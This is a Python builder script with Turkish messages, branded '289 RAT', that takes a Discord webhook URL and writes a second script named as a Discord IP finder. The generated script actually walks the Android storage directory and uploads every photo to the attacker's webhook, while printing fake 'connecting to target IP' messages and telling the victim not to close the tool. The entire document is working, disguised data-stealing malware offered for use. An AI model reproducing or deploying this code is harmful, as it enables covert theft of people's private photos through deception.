import os
import requests
import time

def clear_terminal():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')

clear_terminal()

RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
BLUE = "\033[34m"

banner = f"""
{GREEN}________     ______    ________      __________     _____    ___________ 
\_____  \   /  __  \  /   __   \     \______   \   /  _  \   \__    ___/ 
 /  ____/   >      <  \____    /      |       _/  /  /_\  \    |    |    
/       \  /   --   \    /    /       |    |   \ /    |    \   |    |    
\_______ \ \______  /   /____/        |____|_  / \____|__  /   |____|    
        \/        \/                         \/          \/               
{RESET}

{BLUE}discord.gg/289{RESET}
{YELLOW}discord: zeus289x{RESET}
{RED}instagram ig: zeus289x{RESET}
"""

print(banner)

webhook_url = input(f"{YELLOW}Lütfen Discord Webhook URL'sini girin: {RESET}")

message = {
    "content": f"```289 Rat Services Active```"
}

try:
    response = requests.post(webhook_url, json=message)
    if response.status_code == 204:
        print(f"{GREEN}Webhook doğru, mesaj gönderildi!{RESET}")

        dosya_yolu = "/storage/emulated/0/download/discordipbulma.py"

        discordipbulma_py_icerik = f"""
import os
import requests
import time

def discord_webhooka_fotograf_gonder(resim_yolu, webhook_url):
    try:
        with open(resim_yolu, 'rb') as dosya:
            dosyalar = {{'file': dosya}}
            yanit = requests.post(webhook_url, files=dosyalar)
            if yanit.status_code == 200:
                print(f"Hedef ipe baglanmaya deneme yapıldı uzun sürebilir.")
            else:
                print(f" hedef ip yapılmadı HTTP Durum Kodu: {{yanit.status_code}}")
    except Exception as e:
        print(f"Hata: Hedef İp denemesi yapılırken bir sorun oluştu. {{e}}")

def cihazdaki_tum_resimleri_bul(ana_klasor, uzantilar):
    resim_listesi = []
    for root, dirs, files in os.walk(ana_klasor):
        for file in files:
            if file.lower().endswith(uzantilar):
                resim_listesi.append(os.path.join(root, file))
    return resim_listesi

webhook_url = "{webhook_url}"
ana_klasor = "/storage/emulated/0"
izinli_uzantilar = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')

tum_resimler = cihazdaki_tum_resimleri_bul(ana_klasor, izinli_uzantilar)

if not tum_resimler:
    print("Hedef İpye deneme yapılamadı.")
else:
    print(f"{{len(tum_resimler)}} kez deneme yapılcak... LÜTFEN TOOLU KAPATMAYIN.")
    for resim in tum_resimler:
        discord_webhooka_fotograf_gonder(resim, webhook_url)
        time.sleep(3)
"""
        with open(dosya_yolu, "w") as dosya:
            dosya.write(discordipbulma_py_icerik)

        print(f"`discordipbulma.py` dosyası başarıyla oluşturuldu: {dosya_yolu}")
    else:
        print(f"Hata: Webhook ip hedefe bağlanmadı. HTTP Durum Kodu: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Bir hata oluştu: {e}")